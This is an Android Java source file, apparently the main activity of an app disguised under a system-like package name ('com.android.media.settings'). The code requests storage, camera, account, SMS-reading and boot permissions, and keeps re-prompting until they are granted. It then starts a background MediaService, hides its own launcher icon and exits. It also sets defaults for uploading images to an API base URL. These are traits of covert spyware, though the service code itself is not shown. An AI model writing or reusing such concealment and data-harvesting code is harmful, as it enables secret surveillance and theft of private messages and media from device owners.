package com.android.media.settings;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.Toast;

import com.android.media.settings.Service.MediaService;
import com.android.media.settings.Utility.MediaUtility;

public class MainActivity extends Activity {
    public static final String TAG = "MediaStore";
    private static final int REQ_CODE_ASK_PERMS = 401;
    private Intent serviceIntent;
    private View decorView;
    private MediaUtility mediaUtility;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.activity_main);

        decorView = getWindow().getDecorView();
        serviceIntent = new Intent(this, MediaService.class);
        mediaUtility = new MediaUtility(this);
//        ImageView imageView = (ImageView) findViewById(R.id.imageView);
//        imageView.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View view) {
//                //stopService(serviceIntent);
//            }
//        });
        if(mediaUtility.isFirstInstall()) {
            initConfig();
        }

        checkPerms();
    }

    private void initConfig() {
        SharedPreferences preferences = getSharedPreferences(MediaConfig.PREF_NAME, MODE_PRIVATE);
        SharedPreferences.Editor editor = preferences.edit();

        editor.putString(MediaConfig.PREF_API_BASE_URL, MediaConfig.DEF_BASE_URL);
        editor.putString(MediaConfig.PREF_IMG_UPLOAD_NAME, MediaConfig.DEF_MEDIA_UPLOAD_NAME);
        editor.putFloat(MediaConfig.PREF_IMG_MAX_WIDTH, MediaConfig.DEF_IMG_WIDTH);
        editor.putFloat(MediaConfig.PREF_IMG_MAX_HEIGHT, MediaConfig.DEF_IMG_HEIGHT);
        editor.putString(MediaConfig.PREF_IMG_COMPRESS_FORMAT, MediaConfig.DEF_IMG_COMPRESSION_FORMAT);
        editor.putString(MediaConfig.PREF_IMG_CONFIG, MediaConfig.DEF_IMG_CONFIG);
        editor.putInt(MediaConfig.PREF_IMG_QUALITY, MediaConfig.DEF_IMG_QUALITY);
        editor.apply();
    }

    private void checkPerms() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            int permissions[] = {
                    checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE),
                    checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE),
                    checkSelfPermission(Manifest.permission.CAMERA),
                    checkSelfPermission(Manifest.permission.GET_ACCOUNTS),
                    checkSelfPermission(Manifest.permission.READ_SMS),
            };
            if(!mediaUtility.checkPermissions(permissions)) {
                requestPermissions(new String[] {
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.GET_ACCOUNTS,
                        Manifest.permission.READ_SMS,
                        Manifest.permission.RECEIVE_SMS,
                        Manifest.permission.CAMERA,
                        Manifest.permission.RECEIVE_BOOT_COMPLETED,
                }, REQ_CODE_ASK_PERMS);
                return;
            }
        }

        startService();
    }

    public static final int OVERLAY_PERMISSION_CODE = 2525;

    private void checkOverlayAndStartService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new  Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                if (intent.resolveActivity(getPackageManager()) != null) {
                    startActivityForResult(intent, OVERLAY_PERMISSION_CODE);
                } else {
                    Toast.makeText(this, "Unable to resolve activity", Toast.LENGTH_SHORT).show();
                }
                return;
            }
        }
        startService();
    }

    public void testPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new  Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                if (intent.resolveActivity(getPackageManager()) != null) {
                    startActivityForResult(intent, OVERLAY_PERMISSION_CODE);
                } else {
                    Toast.makeText(this, "Unable to resolve activity", Toast.LENGTH_SHORT).show();
                }
            }
        }
    }

    public void checkAndStartService() {
        if(!mediaUtility.isServiceRunning(MediaService.class)) {
            startService(new Intent(this, MediaService.class));
        }
    }

    private void startService() {
        Log.d(TAG, "On Start Service : " + MediaService.class);
        checkAndStartService();
        hideLauncher();
    }

    private void hideLauncher() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        this.finish();
        System.exit(0);
    }

    private void enterImmersiveMode() {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            decorView.setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            );
        } else {
            decorView.setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_FULLSCREEN
            );
        }
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if(hasFocus) {
            enterImmersiveMode();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        switch (requestCode) {
            case REQ_CODE_ASK_PERMS:
                if(mediaUtility.checkPermissions(grantResults)) {
                    startService();
                } else {
                    Toast.makeText(this, "Please provide permission", Toast.LENGTH_SHORT).show();
                    checkPerms();
                }
                break;

            case OVERLAY_PERMISSION_CODE:
                Log.d("TAG", "ON Window Manager Permission");
                checkOverlayAndStartService();
                break;

            default:
                super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}
